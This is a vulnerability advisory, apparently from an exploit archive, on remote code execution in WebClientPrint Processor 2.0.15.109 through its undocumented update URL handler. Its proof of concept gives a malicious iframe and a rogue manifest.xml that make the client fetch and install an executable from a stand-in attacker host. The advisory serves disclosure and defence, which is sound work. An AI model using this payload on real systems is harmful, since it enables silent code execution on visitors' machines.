@@ -1,0 +1,140 @@
+id: 28361
+date: 08/23/2017
+title: WebClientPrint Processor 2.0.15.109 Updates Remote Code Execution Vulnerability
+author: RedTeam
+cves: 
+
+Advisory: WebClientPrint Processor 2.0: Remote Code Execution via Updates
+
+RedTeam Pentesting discovered that rogue updates trigger a remote code
+execution vulnerability in WebClientPrint Processor (WCPP). These
+updates may be distributed through specially crafted websites and are
+processed without any user interaction as soon as the website is
+accessed. However, the browser must run with administrative privileges.
+
+
+Details
+=======
+
+Product: Neodynamic WebClientPrint Processor
+Affected Versions: 2.0.15.109 (Microsoft Windows)
+Fixed Versions: >= 2.0.15.910
+Vulnerability Type: Remote Code Execution
+Security Risk: low
+Vendor URL: http://www.neodynamic.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-009
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Neodynamic's WebClientPrint Processor is a client-side application,
+which allows server-side applications to print documents on a client's
+printer without user interaction, bypassing the browser's print
+functionality. The server-side application may be written in ASP.NET or
+PHP while on the client-side multiple platforms and browsers are
+supported.
+
+"Send raw data, text and native commands to client printers without
+showing or displaying any print dialog box!" (Neodynamic's website)
+
+
+More Details
+============
+
+Upon installation under Microsoft Windows, WCPP registers itself as a
+handler for the "webclientprint" URL scheme. Thus, any URL starting with
+"webclientprint:" is handled by WCPP. For example, entering
+
+webclientprint:-about
+
+in the URL bar of a browser opens the about box of WCPP.
+
+During RedTeam Pentesting's investigation it turned out that WCPP
+supports an undocumented update mechanism. Through the following URL the
+update mechanism is triggered:
+
+webclientprint:-update:http://legitimate.example.com/somedir/manifest.xml
+
+This instructs WCPP to fetch the file "manifest.xml" from the
+"legitimate.example.com" host. Furthermore, it was found that an XML
+file of the following structure is expected:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<manifest>
+  <AvailableVersion>5.0.0</AvailableVersion>
+  <AppUrl>http://legitimate.example.com/somedir/wcpp.exe</AppUrl>
+</manifest>
+------------------------------------------------------------------------
+
+Next, the XML file is parsed and the updated version of WCPP is fetched
+from the URL
+
+http://legitimate.example.com/somedir/wcpp.exe
+
+with the returned byte stream being written to
+
+C:\Program Files (x86)\Neodynamic\WCPP for Windows\v2.0\wcpp.exe
+
+on a Windows 7 x86_64 machine. For the write process to succeed,
+elevated or administrative privileges are required. Thus, the browser
+which invokes WCPP must run with elevated or administrative privileges.
+
+
+Proof of Concept
+================
+
+An attacker may prepare a malicious website containing the following
+HTML code:
+
+------------------------------------------------------------------------
+<html>
+<body>
+<iframe src="webclientprint:-update:http://attack.example.com/somedir/manifest.xml">
+</iframe>
+</body>
+</html>
+------------------------------------------------------------------------
+
+Furthermore, the attacker can provide a rogue manifest.xml as follows:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<manifest>
+  <AvailableVersion>5.0.0</AvailableVersion>
+  <AppUrl>http://attack.example.com/somedir/wcpp.exe</AppUrl>
+</manifest>
+------------------------------------------------------------------------
+
+Finally, arbitrary code may be placed at the AppUrl URL:
+
+http://attack.example.com/somedir/wcpp.exe
+
+If the malicious website is visited by a WCPP user, the WCPP handler
+(wcpp.exe) of the user's machine is replaced by code arbitrarily chosen
+by the attacker. A visual indication of the update progress is displayed
+and the success is indicated through a message box. However, successful
+exploitation requires no user interaction. Any subsequent invocation of
+an arbitrary webclientprint URL will result in the execution of the
+attacker's code. Thus, the attacker may deliver a second inline frame
+containing a webclientprint URL in order to force immediate execution of
+the attacker's code.
+
+
+Workaround
+==========
+
+Affected users should disable the WCPP handler and upgrade to a fixed
+version as soon as possible.
+
+Fix
+===
+
+Install a WCPP version greater or equal to 2.0.15.910[0].
+
+#  0day.today [2023-03-24]  #
